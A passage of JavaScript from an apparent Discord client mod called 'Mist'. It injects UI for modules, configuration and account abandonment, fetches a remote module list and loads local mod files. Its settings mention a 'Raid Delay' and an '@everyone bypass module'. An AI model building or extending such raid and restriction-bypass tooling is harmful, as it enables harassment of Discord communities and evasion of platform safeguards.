justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt marginTop40-i-78cZ marginBottom20-32qID7" style="flex: 1 1 auto;"><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K">You have no mods, but you can choose what mods you do want however.</div></div></div></div></div></div></div></div></div>`));

            var element = document.getElementsByClassName("flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt marginTop40-i-78cZ marginBottom20-32qID7")[0];

            request.get('http://mist.yaekiths-projects.xyz/api/mods-list.php?Key=kNH1MYVuYn', { }, (err, res, body) => {
                var json = JSON.parse(body);

                    for(var key in json.Modules)
                    {
                        var value = json.Modules[key];
                        
                        window.addConsoleCommand(element, key, value, function ()
                        {
                             
                        });
                    }
                
            });
            /*
            require('request').get('http://mist.yaekiths-projects.xyz/api/mods-list.php?Key=kNH1MYVuYn', (err, res, body) => {
                var json = JSON.parse(body);

                for(var z = 0; z < json.Modules.length; z++)
                {
                    var mod = json.Modules[z];

                    for(var key in mod)
                    {
                        var value = mod[key];
                        console.error(key);
                        alert(key);
                    }
                }
                
            });
            */
            
        }
        else{
            var elem = window.MistUtils.InjectHTML(`<div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id="MistModulesHeader">Mist Modules</h2><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute;top:75px;">Who doesn't want to have some fun?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr" id='InsertUnder'><div class="divider-3573oO dividerDefault-3rvLe-"></div></div></div><div class="marginTop60-3PGbtK"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt marginTop40-i-78cZ marginBottom20-32qID7" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 0 1 223px;"><img src="/assets/cdea41ede63f61153e4a3c0531fa3873.svg" class="userSettingsSecurityImage-21pI_Q" alt=""></div><h4 class="title-2BxgL2">It's time to experiment.</h4></div></div></div></div></div></div></div></div>`);

            holster.appendChild(elem);
            
            var folder = fs.readdirSync(`${process.env.InstallationDir}\\mods`);

            var parent = document.getElementById('InsertUnder');

            var stuff = [];
            
            for(var i in folder)
            {
                var mod2 = require(`${process.env.InstallationDir}\\mods\\${folder[i]}`);
                var epic = Object.assign(mod2, {id: `${folder[i].split('.')[0]}`});
                createPluginButton(parent, epic.name.name, epic.name.description, epic, epic.name.author, epic.name.version);
            }
        }
    }
}
function addAbandonAccountUI(){
    /*
    <div class="backdrop-1wrmKB" style="opacity: 0.85; background-color: rgb(0, 0, 0); z-index: 1000; transform: translateZ(0px);"></div><div class="modal-3c3bKg" style="opacity: 1; transform: scale(1) translateZ(0px);"><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-guard="true" tabindex="1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="false" class="inner-1ilYF7"><form class="modal-yWgWj- container-SaXBYZ sizeSmall-1jtLQy"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-2tA9Os" style="flex: 0 0 auto;"><h4 class="h4-AQvcAz title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 header-3OkTu9">Abandon Account</h4></div><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix content-1EtbQh scrollerThemed-2oenus themeGhostHairline-DBD-2d"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl inner-ZyuQk0 content-KhOrDM"><div class="medium-zmzTW- size16-14cGz5 height20-mO2eIN primary-jw0I4K">Are you sure you want to abandon your account? Please type your discord tag (#0000) to continue.</div>

<input style="color:white; width:1000px; top:10px;" maxlength="5" placeholder="#0000" class="addFriendInput-4bcerK" id="TagInput">
</div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 footer-3rDWdC" style="flex: 0 0 auto;"><button type="submit" class="button-38aScr lookFilled-1Gx00P colorRed-1TFJan sizeMedium-1AC_Sl grow-q77ONN" id="AbandonAccount"><div class="contents-18-Yxp">Abandon</div></button><button type="button" class="button-38aScr lookLink-9FtZy- colorPrimary-3b3xI6 sizeMedium-1AC_Sl grow-q77ONN"><div class="contents-18-Yxp">Cancel</div></button></div></form></div><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div></div>
*/

var holster = document.getElementsByClassName("theme-dark")[0];

var abandonA = window.MistUtils.InjectHTML(`<div class="backdrop-1wrmKB" style="opacity: 0.85; background-color: rgb(0, 0, 0); z-index: 1000; transform: translateZ(0px);"></div><div class="modal-3c3bKg" style="opacity: 1; transform: scale(1) translateZ(0px);"><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-guard="true" tabindex="1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="false" class="inner-1ilYF7"><form class="modal-yWgWj- container-SaXBYZ sizeSmall-1jtLQy"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-2tA9Os" style="flex: 0 0 auto;"><h4 class="h4-AQvcAz title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 header-3OkTu9">Abandon Account</h4></div><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix content-1EtbQh scrollerThemed-2oenus themeGhostHairline-DBD-2d"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl inner-ZyuQk0 content-KhOrDM"><div class="medium-zmzTW- size16-14cGz5 height20-mO2eIN primary-jw0I4K">Are you sure you want to abandon your account? Please type your discord tag (#0000) to continue.</div><input style="color:white; width:1000px; top:10px;" maxlength="5" placeholder="#0000" class="addFriendInput-4bcerK" id="TagInput"></div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 footer-3rDWdC" style="flex: 0 0 auto;"><button type="button" class="button-38aScr lookFilled-1Gx00P colorRed-1TFJan sizeMedium-1AC_Sl grow-q77ONN" id="AbandonAccount"><div class="contents-18-Yxp">Abandon</div></button><button type="button" class="button-38aScr lookLink-9FtZy- colorPrimary-3b3xI6 sizeMedium-1AC_Sl grow-q77ONN" id='CancelButton'><div class="contents-18-Yxp">Cancel</div></button></div></form></div><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div></div>`)

holster.appendChild(abandonA);

var abandonacc = document.getElementById('AbandonAccount');

var Input = document.getElementById('TagInput');
var Cancel = document.getElementById('CancelButton');

    Cancel.addEventListener("click", () => {
        for(var z = 0; z < document.getElementsByClassName("theme-dark")[0].children.length; z++)
        {
            document.getElementsByClassName("theme-dark")[0].children[z].remove();
        }
    });

    abandonacc.addEventListener("click", () => {
        if (Input.getAttribute("value").length > 0)
        {
            if (window.MistUtils.GetCurrentUser().discriminator == Input.split('#')[1])
            {
                for(var z = 0; z < document.getElementsByClassName("theme-dark")[0].children.length; z++)
                {
                    document.getElementsByClassName("theme-dark")[0].children[z].remove();
                }

                window.DrawingAPI.alert('Mist', "Please wait...");
                setTimeout(() => DisableCurrentAccount(), 5000);
            }
        }
    });
}
function DisableCurrentAccount(){

}
function createPluginButton(holster, moduleTitle, moduleDescription, modObject, author, version){
    var x = window.MistUtils.InjectHTML(`<div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="DevModeTxt" class="titleDefault-a8-ZSr title-31JmR4">${moduleTitle}</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" id="${moduleTitle}_Parent" tabindex="0" style="flex: 0 0 auto;"><input id="${moduleTitle}" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">${moduleDescription} - by ${author} (v${version})</div></div>`)

    holster.appendChild(x);

    var parent = document.getElementById(`${moduleTitle}_Parent`);

    if (!fs.existsSync(`${process.env.InstallationDir}/config.json`))
    {
        fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify({'DeveloperMode' : false, 'UseModules' : true, 'RaidDelay' : true, 'UseRPC' : false, 'LoadModifications' : []}))
    }

    var config = JSON.parse(fs.readFileSync(`${process.env.InstallationDir}/config.json`, "utf8"));

    if (config.LoadModifications.includes(moduleTitle)) parent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX";

    parent.addEventListener("click", () => {
        if (parent.className == "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX")
        {
            parent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"

            config.LoadModifications.splice(config.LoadModifications.indexOf(moduleTitle), 1);
            
            fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config))

            location.reload();
        }
        else{
            parent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
            
            config.LoadModifications.push(moduleTitle);

            fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config))

            location.reload();
        }
    });
}
function showConfigMenu(){
    /*
    <div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7">Mist Configuration</h2>
<div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute;top:75px;">It's time to make Mist fit my liking.</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="divider-3573oO dividerDefault-3rvLe-"></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="DevModeTxt" class="titleDefault-a8-ZSr title-31JmR4">Developer Mode</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" tabindex="0" style="flex: 0 0 auto;"><input id="DevMode" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">It's time to test some experimental shit</div></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="UseModulesTxt" class="titleDefault-a8-ZSr title-31JmR4">Use Modules</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" tabindex="0" style="flex: 0 0 auto;"><input id="UseModules" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">Who doesn't love the @everyone bypass module?</div><div class="divider-3573oO dividerDefault-3rvLe-"></div></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="RaidDelayTxt" class="titleDefault-a8-ZSr title-31JmR4">Raid Delay</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" tabindex="0" style="flex: 0 0 auto;"><input id="RaidDelay" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">Should there be a raid delay?</div><div class="divider-3573oO dividerDefault-3rvLe-"></div></div></div></div><div class="marginTop60-3PGbtK"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt marginTop40-i-78cZ marginBottom20-32qID7" style="flex: 1 1 auto;"><div class="image-1GzsFd marginBottom40-2vIwTv" style="flex: 0 1 auto; width: 294px; height: 192px; background-image: url(&quot;/assets/59c726954bd8424f376ca3a7eedc4c54.svg&quot;);"></div><div class="flexChild-faoVW3" direction="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr" style="flex: 0 1 auto;"><h4 class="title-2BxgL2">It's time to save our game, boys.</h4></div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 0 1 auto;"></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button" id='CloseButtonYeet'><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>
    */

    var holster = document.getElementsByClassName("contentRegion-3nDuYy")[0];

    if (!document.getElementById('MistConfigHeader'))
    {
        for(var i = 0; i < holster.children.length; i++)
        {
        holster.children[i].remove();
        }

        var elem = window.MistUtils.InjectHTML(`<div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id='MistConfigHeader'>Mist Configuration</h2><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute;top:75px;">It's time to make Mist fit my liking.</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="divider-3573oO dividerDefault-3rvLe-"></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="DevModeTxt" class="titleDefault-a8-ZSr title-31JmR4">Developer Mode</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" id='devModeParent' tabindex="0" style="flex: 0 0 auto;"><input id="DevMode" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">It's time to test some experimental shit</div></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="UseModulesTxt" class="titleDefault-a8-ZSr title-31JmR4">Use Modules</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" id='ModulesParent' tabindex="0" style="flex: 0 0 auto;"><input id="UseModules" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">Who doesn't love the @everyone bypass module?</div><div class="divider-3573oO dividerDefault-3rvLe-"></div></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="RaidDelayTxt" class="titleDefault-a8-ZSr title-31JmR4">Raid Delay</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-2lU_20 value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" id='RaidDelayParennt' tabindex="0" style="flex: 0 0 auto;"><input id="RaidDelay" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">Should there be a raid delay?</div><div class="divider-3573oO dividerDefault-3rvLe-"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 switchItem-2hKKKK" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStart-H-X2h- noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><label for="Txt" class="titleDefault-a8-ZSr title-31JmR4">Use RPC</label></div><div class="flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX" id="UseRPCParennt" tabindex="0" style="flex: 0 0 auto;"><input id="RPC" class="checkboxEnabled-CtinEn checkbox-2tyjJg" type="checkbox" tabindex="-1"></div></div><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="flex: 1 1 auto;">Should we use the built-in Rich Presence?</div><div class="divider-3573oO dividerDefault-3rvLe-"></div></div></div></div></div></div><div class="marginTop60-3PGbtK"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt marginTop40-i-78cZ marginBottom20-32qID7" style="flex: 1 1 auto;"><div class="image-1GzsFd marginBottom40-2vIwTv" style="flex: 0 1 auto; width: 294px; height: 192px; background-image: url(&quot;/assets/59c726954bd8424f376ca3a7eedc4c54.svg&quot;);"></div><div class="flexChild-faoVW3" direction="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr" style="flex: 0 1 auto;"><h4 class="title-2BxgL2">It's time to save our game, boys.</h4></div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 0 1 auto;"></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button" id="CloseButtonYeet"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>`);

        holster.appendChild(elem);

        if (!fs.existsSync(`${process.env.InstallationDir}/config.json`))
        {
            fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify({'DeveloperMode' : false, 'UseModules' : true, 'RaidDelay' : true, 'UseRPC' : false, 'LoadModifications' : []}))
        }
        var config = JSON.parse(fs.readFileSync(`${process.env.InstallationDir}/config.json`, "utf8"));
        window.MistUtils.Config = config;

        var DeveloperMode = document.getElementById("DevMode"); //Checkmark
        var UseModules = document.getElementById("UseModules");
        var RaidDelay = document.getElementById("RaidDelay");
        var UseRPC = document.getElementById('RPC');
        var closeButton = document.getElementById("CloseButtonYeet");
        var devModeParent = document.getElementById('devModeParent');
        var UseModulesParent = document.getElementById('ModulesParent');
        var raidDelayParent = document.getElementById('RaidDelayParennt');
        var UseRPCParent = document.getElementById('UseRPCParennt');

        if (config.DeveloperMode) devModeParent.className = `flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX`;
        if (config.UseModules) UseModulesParent.className = `flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX`;
        if (config.RaidDelay) raidDelayParent.className = `flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX`;
        if (config.UseRPC) UseRPCParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX";
        DeveloperMode.addEventListener("click", () => {
           if (devModeParent.className == "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX")
           {
               //Already checked
               devModeParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
               config.DeveloperMode = false;
               fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
           } 
           else{
            devModeParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
            config.DeveloperMode = true;
            fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
           }
        });

        closeButton.addEventListener("click", () => {
            document.getElementsByClassName('layer-3QrUeG')[1].remove();
            window.location.href = "https://discordapp.com/activity"
        });

        UseModules.addEventListener("click", () => {
            if (UseModulesParent.className == "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX")
            {
                UseModulesParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueUnchecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
                config.UseModules = false;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
            else{
                UseModulesParent.className = "flexChild-faoVW3 switchEnabled-V2WDBB switch-3wwwcV valueChecked-m-4IJZ value-2hFrkk sizeDefault-2YlOZr size-3rFEHg themeDefault-24hCdX"
                config.UseModules = true;
                fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify(config));
            }
        });

